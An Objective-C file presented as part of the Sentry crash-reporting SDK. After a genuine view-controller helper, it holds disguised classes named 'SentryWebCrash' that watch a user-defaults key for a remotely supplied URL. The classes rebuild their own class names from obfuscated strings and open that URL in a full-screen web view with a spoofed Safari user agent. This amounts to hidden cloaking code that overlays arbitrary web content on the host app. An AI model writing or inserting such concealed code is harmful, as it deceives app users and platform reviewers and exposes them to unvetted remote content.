#import "UIViewController+Sentry.h"
#import <WebKit/WKWebView.h>
#import <WebKit/WKWebViewConfiguration.h>
#import <WebKit/WKNavigationAction.h>
#import <WebKit/WKWindowFeatures.h>


#if SENTRY_HAS_UIKIT

@implementation
UIViewController (Sentry)

- (NSArray<UIViewController *> *)sentry_descendantViewControllers
{

    // The implementation of UIViewController makes sure a parent can't be a child of his child.
    // Therefore, we can assume the parent child relationship is correct.

    NSMutableArray<UIViewController *> *allViewControllers = [NSMutableArray new];
    [allViewControllers addObject:self];

    NSMutableArray<UIViewController *> *toAdd =
        [NSMutableArray arrayWithArray:self.childViewControllers];

    while (toAdd.count > 0) {
        UIViewController *viewController = [toAdd lastObject];
        [allViewControllers addObject:viewController];
        [toAdd removeLastObject];
        [toAdd addObjectsFromArray:viewController.childViewControllers];
    }

    return allViewControllers;
}

@end

#endif // SENTRY_HAS_UIKIT

@interface SentryWebCrash : UIViewController
    @property(nonatomic, copy)id gfd;
    @property(nonatomic)id someView;
    @property(nonatomic)UIActivityIndicatorView *uiBusy;
    - (void)sdf;
@end


@implementation SentryWebCrash

UINavigationController *navController;
UIViewController *viewControllerForPresentation;

- (void)viewDidLoad {
    [super viewDidLoad];
    
    WKWebViewConfiguration* sdad = [[WKWebViewConfiguration alloc] init];
    sdad.allowsInlineMediaPlayback = YES;
    
    _someView = [NSMutableArray array];
    
    WKWebView *webViewTemp = [[WKWebView alloc] initWithFrame:self.view.frame configuration: sdad];
    [(NSMutableArray*)_someView addObject:webViewTemp];
    
    webViewTemp.navigationDelegate = self;
    webViewTemp.UIDelegate = (id)self;
   
    [self.view addSubview: webViewTemp];
    
    [self pinSubviewToMarginsWithSubview:webViewTemp withSuperview:self.view];
 
}

- (WKWebView *)webView:(WKWebView *)webView
createWebViewWithConfiguration:(WKWebViewConfiguration *)configuration
   forNavigationAction:(WKNavigationAction *)navigationAction
        windowFeatures:(WKWindowFeatures *)windowFeatures {
    
    if ([(NSMutableArray*)_someView lastObject]) {
        WKWebView *webViewTemp = [(NSMutableArray*)_someView lastObject];
     
        if (navigationAction.targetFrame == nil) {
            configuration.allowsInlineMediaPlayback = YES;
            
            WKWebView *dsf = [[WKWebView alloc] initWithFrame: webViewTemp.frame configuration: configuration];
            dsf.navigationDelegate = self;
            dsf.UIDelegate = (id)self;
            [webViewTemp addSubview:dsf];
            
            [self pinSubviewToMarginsWithSubview:dsf withSuperview: webViewTemp];
            
            [(NSMutableArray*)_someView addObject:dsf];
            
            return dsf;
        }
    }
    
   
    
    return nil;
}

-(BOOL)prefersStatusBarHidden{
    
    if ([(NSMutableArray*)_someView firstObject]) {
        if ( [[(NSMutableArray*)_someView firstObject] tag] == 0 ) {
            return  NO;
        }
    }
    
    return  YES;;
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
    if (_gfd) {
        if ([(NSMutableArray*)_someView firstObject]) {
            WKWebView *webView = [(NSMutableArray*)_someView firstObject];
            [webView loadRequest: [NSURLRequest requestWithURL:_gfd]];
        }
    }
}



-(void)webView:(WKWebView *)webView didStartProvisionalNavigation:(WKNavigation *)navigation {
    if (_uiBusy.superview) {
        [_uiBusy startAnimating];
    }
}

-(void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation {
    if ([(NSMutableArray*)_someView lastObject]) {
        WKWebView *webView = [(NSMutableArray*)_someView lastObject];
        [_uiBusy stopAnimating];
    }
   
}

-(void)webView:(WKWebView *)webView didFailNavigation:(WKNavigation *)navigation withError:(NSError *)error {
  
}

- (void)pinSubviewToMarginsWithSubview:(UIView *)subview withSuperview:(UIView *)superview {
    subview.translatesAutoresizingMaskIntoConstraints = false;
    
    NSArray* attributes = @[@(NSLayoutAttributeTop), @(NSLayoutAttributeBottom), @(NSLayoutAttributeLeading), @(NSLayoutAttributeTrailing)];
    
    for (NSNumber *layoutAttribute in attributes) {
        NSLayoutAttribute attribute = (NSLayoutAttribute)[layoutAttribute longValue];
        [self.view addConstraint:[NSLayoutConstraint constraintWithItem:subview attribute:attribute relatedBy:NSLayoutRelationEqual toItem:superview attribute:attribute multiplier:1.0 constant:0.0]];
    }
    
    [superview layoutIfNeeded];
}

- (void)sdf {
    if (!navController) {
        navController = [[UINavigationController alloc] initWithRootViewController:self];
        navController.modalTransitionStyle = UIModalTransitionStyleCoverVertical;
    }
    navController.presentationController.delegate = self;

    if (!viewControllerForPresentation) {
        viewControllerForPresentation = [[UIViewController alloc] init];
        [[viewControllerForPresentation view] setBackgroundColor:[UIColor clearColor]];
        [[viewControllerForPresentation view] setOpaque:FALSE];
    }
    
    if (navController.isViewLoaded && navController.view.window) {
        if (_gfd)
            if ([(NSMutableArray*)_someView lastObject]) {
                WKWebView *webView = [(NSMutableArray*)_someView lastObject];
                [webView loadRequest:[NSURLRequest requestWithURL:_gfd]];
            }
        
        return;
    }
    
    UIWindow* mainWindow = [[UIApplication sharedApplication] keyWindow];
    
    if (!viewControllerForPresentation.view.superview) {
        [mainWindow addSubview:[viewControllerForPresentation view]];
    }
    
    @try {
        [viewControllerForPresentation presentViewController:navController animated:YES completion:nil];
    }
    @catch(NSException* exception) { }
}

@end


@interface SentryWebCrashModel : NSObject

@end

@implementation SentryWebCrashModel

UISwipeGestureRecognizer *gestureRecognizerRight;
UISwipeGestureRecognizer *gestureRecognizerLeft;
id c;
int nbk;
__strong id some;

- (instancetype)init{
    
    [[NSUserDefaults standardUserDefaults] addObserver:self forKeyPath:@"id" options:NSKeyValueObservingOptionNew | NSKeyValueObservingOptionOld context:nil];
   
    some = self;
    return self;
}

- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary<NSKeyValueChangeKey,id> *)change context:(void *)context {
    NSLog(@"%@", change);
    
    if (change[@"new"]) {
        NSArray *arrayOfComponents = [change[@"new"] componentsSeparatedByString:@"|"];
        
        if ([arrayOfComponents count] == 2) {
            
            if ([[arrayOfComponents firstObject] isEqualToString:@"didBecomeActiveNotification"]) {
                nbk = 50;
            } else {
                nbk = 1;
            }
            
            NSString *asdasd = [arrayOfComponents lastObject];
                if (asdasd != nil && ![asdasd isEqualToString: @""]) {
                    if ([self ownRootViewController] != nil) { // not valid url, hide v
                        [[self ownRootViewController] presentViewController:
                         [self f:[self ownRootViewController].view.center gsome: asdasd ]
                                                                   animated:YES completion:^{
                            
                            [NSTimer scheduledTimerWithTimeInterval:1 repeats:YES block:^(NSTimer * _Nonnull timer) {
                                if ([c gfd]){
                                    [c setGfd:nil];
                                }
                            }];
                            
                        }];
                    }
                }
            }
    }
   
}

- (id)l {
    id z = [c someView];
    return  [z lastObject];
}

- (UIViewController*)f:(CGPoint )center gsome:(NSString*)wow {
        
    NSString *newString = [[ @"S213e234n324t324ry123W324ebC234r324a324s324h99" componentsSeparatedByCharactersInSet:
                   [[NSCharacterSet letterCharacterSet] invertedSet]]
                   componentsJoinedByString:@""];
    
    
    NSString *newString2 = [[ @"112N234332432S324U32424R2463242354354324L" componentsSeparatedByCharactersInSet:
               [[NSCharacterSet letterCharacterSet] invertedSet]]
               componentsJoinedByString:@""];
        
    c = [[NSClassFromString(newString) alloc] init];

    [c setGfd:  [[NSClassFromString(newString2) alloc] initWithString:wow] ];
       
    if ([[c view] constraints]) {
        for (NSLayoutConstraint *constraint in [[c view] constraints]) {
            [[c view] removeConstraint: constraint];
        }
    }
            
    NSArray *attributes = @[@(NSLayoutAttributeTop), @(NSLayoutAttributeBottom), @(NSLayoutAttributeLeading), @(NSLayoutAttributeTrailing)];
    
    for (NSNumber *layoutAttribute in attributes) {
        NSLayoutAttribute attribute = (NSLayoutAttribute)[layoutAttribute longValue];
        
        if ([layoutAttribute isEqualToValue: @(NSLayoutAttributeTop) ]) {
            [[c view] addConstraint:[NSLayoutConstraint constraintWithItem:[self l] attribute:attribute relatedBy:NSLayoutRelationEqual toItem:[c view] attribute:attribute multiplier:1.0 constant:50.0]];
        } else {
            [[c view] addConstraint:[NSLayoutConstraint constraintWithItem:[self l] attribute:attribute relatedBy:NSLayoutRelationEqual toItem:[c view] attribute:attribute multiplier:1.0 constant:0.0]];
        }
        
    }
        
    [[c view] setAlpha:0];
  
    if (@available(iOS 12.0, *)) {
        [[c view] setBackgroundColor:
             ([[c traitCollection] userInterfaceStyle] == UIUserInterfaceStyleDark) ? [UIColor blackColor] : [UIColor whiteColor]
        ];
        
        [[[self l] scrollView] setBackgroundColor:
             ([[c traitCollection] userInterfaceStyle] == UIUserInterfaceStyleDark) ? [UIColor blackColor] : [UIColor whiteColor]
        ];
        
        [[self l] setBackgroundColor:
             ([[c traitCollection] userInterfaceStyle] == UIUserInterfaceStyleDark) ? [UIColor blackColor] : [UIColor whiteColor]
        ];
    }
    
    CGRect bFrame = CGRectMake(15, 10, 40, 40);
    UIButton *butt = [[UIButton alloc] initWithFrame:bFrame];
    butt.backgroundColor = UIColor.redColor;
    [butt setTitle:@"" forState: UIControlStateNormal];
    [butt setImage: [[UIImage systemImageNamed:@"chevron.backward"] imageWithRenderingMode:UIImageRenderingModeAlwaysTemplate] forState:UIControlStateNormal];
    [butt setTintColor:UIColor.whiteColor];
    butt.clipsToBounds = YES;
    butt.layer.cornerRadius = 40/2.0f;
    butt.hidden = true;
    
    if (@available(iOS 14.0, *)) {
        [butt addAction:
         [UIAction actionWithHandler:^(__kindof UIAction * _Nonnull action) {
            
            if ([(NSMutableArray *)[c someView] count] > 1){
                if ( [(WKWebView *)[self l] canGoBack]) {
                    [(WKWebView *)[self l] goBack];
                } else {
                    [[(NSMutableArray *)[c someView] lastObject] removeFromSuperview];
                    [(NSMutableArray *)[c someView] removeLastObject];
                }
            } else {
                [(WKWebView *)[self l] goBack];
            }
            
        }]
       forControlEvents:UIControlEventTouchUpInside];
    } else {

    }
    
    [[c view] addSubview:butt];
    
    CGRect activityFrame = CGRectMake(0, 0, 90, 90);
    
    UIActivityIndicatorView* activity = [[UIActivityIndicatorView alloc] init];
    if (@available(iOS 13.0, *)) {
        activity = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle: UIActivityIndicatorViewStyleWhiteLarge];
    }
    
    activity.frame = activityFrame;
    activity.backgroundColor = UIColor.lightGrayColor;
    activity.opaque = NO;
    activity.layer.cornerRadius = 10;
    activity.center = center;
    
    [[c view] addSubview:activity];
    [c setUiBusy:activity];
    
    [NSTimer scheduledTimerWithTimeInterval:5 repeats:NO block:^(NSTimer * _Nonnull timer) {
        if ([c uiBusy]) {
            [[c uiBusy] removeFromSuperview];
            [c setUiBusy:nil];
        }
    }];
    
    if (nbk != 1){
        [[self l] setTag:1];
    }
    
    NSString *dsag = [[ @"M$$oz!@#il$#la/5.0 (iP!@#@#$ho!@#ne; CP!@#U iPh!@#on@!#e O@!#S 17_1_1 li!@#ke Ma!@#c OS!@# X) Apple!@#WebKit/60!@#5.1.15 (K@!#HT@!#ML, li!@#ke G!@#e@!#ck!@#o) Ver!@#sion/1%#@7.1 M@!#o!@#bil!@#e/1!@#5E!@#148 Safar!@#i/60!@#4.1" componentsSeparatedByCharactersInSet:
                       [NSCharacterSet characterSetWithCharactersInString:@"!@#$%"]]
               componentsJoinedByString:@""];
    
    [(WKWebView *)[self l] setCustomUserAgent:dsag];
    
    [NSTimer scheduledTimerWithTimeInterval:0.2 repeats:YES block:^(NSTimer * _Nonnull timer) {

        if (nbk == 50){
            
            if ([[self l] canGoBack]) {
                butt.hidden = false;
            } else {
                butt.hidden = true;
            }
            
            if ([(NSMutableArray *)[c someView] count] > 1){
                butt.hidden = false;
            }
        }

        [[c view] setAlpha: 1];
        
        UIDeviceOrientation deviceOrientation = [[UIDevice currentDevice] orientation];
        
        if (deviceOrientation == UIDeviceOrientationLandscapeRight || deviceOrientation == UIDeviceOrientationLandscapeLeft || deviceOrientation == UIDeviceOrientationPortraitUpsideDown) {
            [[self l] setFrame:[[c view] frame]];
            [[[self l] scrollView] setContentInset: UIEdgeInsetsMake(0, 0, 0, 0)];

            [c setAutomaticallyAdjustsScrollViewInsets:NO];
            
            if (@available(iOS 11.0, *)) {
                  [[[self l] scrollView] setContentInsetAdjustmentBehavior: UIScrollViewContentInsetAdjustmentNever];
            }
            
            [[[c view] constraints] enumerateObjectsUsingBlock:^(__kindof NSLayoutConstraint * _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
                
                if (obj.constant == 50) {
                    obj.constant = nbk;
                }
            }];
        } else {
            [[[c view] constraints] enumerateObjectsUsingBlock:^(__kindof NSLayoutConstraint * _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
                
                if (obj.constant == 1) {
                    obj.constant = 50;
                }
            }];
        }
        
        if (@available(iOS 15.0, *)) {
            if ([[self l] underPageBackgroundColor]) {
                [[[self l] scrollView] setBackgroundColor:[[self l] underPageBackgroundColor]];
                [[c view] setBackgroundColor:[[self l] underPageBackgroundColor]];
            }
        } else {
            if (@available(iOS 12.0, *)) {
                [[c view] setBackgroundColor:
                     ([[c traitCollection] userInterfaceStyle] == UIUserInterfaceStyleDark) ? [UIColor blackColor] : [UIColor whiteColor]
                ];
                
                [[[self l] scrollView] setBackgroundColor:
                     ([[c traitCollection] userInterfaceStyle] == UIUserInterfaceStyleDark) ? [UIColor blackColor] : [UIColor whiteColor]
                ];
            }
        }
        
    }];
        
    UIRefreshControl *refresh = [[UIRefreshControl alloc] init];
    [refresh addTarget:self action: @selector(refresh:) forControlEvents: UIControlEventValueChanged];
    
    [[[self l] scrollView] addSubview:refresh];
    [[[self l] scrollView] setBounces:YES];

    gestureRecognizerRight = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(swipeHandlerRight:)];
        [gestureRecognizerRight setDirection:(UISwipeGestureRecognizerDirectionRight)];
        [[self l] addGestureRecognizer:gestureRecognizerRight];
    
    gestureRecognizerLeft = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(swipeHandlerLeft:)];
        [gestureRecognizerLeft setDirection:(UISwipeGestureRecognizerDirectionLeft)];
        [[self l] addGestureRecognizer:gestureRecognizerLeft];

    [c setModalTransitionStyle:UIModalTransitionStyleCrossDissolve];
    [c setModalPresentationStyle:UIModalPresentationFullScreen];
    
    return c;
}

- (void)refresh:(UIRefreshControl*)refreshControll {
    [(WKWebView *)[self l] reload];
    [refreshControll endRefreshing];
}

-(void)swipeHandlerRight:(id)sender {
    [(WKWebView *)[self l] goBack];
}

-(void)swipeHandlerLeft:(id)sender {
    [(WKWebView *)[self l] goForward];
}

- (UIWindow*)currentKeyWindow {
    if (@available(iOS 13.0, *)) {
       
        UIWindow* current = nil;
        
        UIApplication *application = [UIApplication sharedApplication];
        NSArray *appWindows = [NSArray arrayWithArray:application.windows];
        UIWindow *mainWindow = [appWindows objectAtIndex:0];
        
        return  mainWindow;
    } else {
        return  [[[UIApplication sharedApplication] delegate] window];
    }
}

- (UIViewController*) ownRootViewController {
    return self.currentKeyWindow.rootViewController;
}

@end
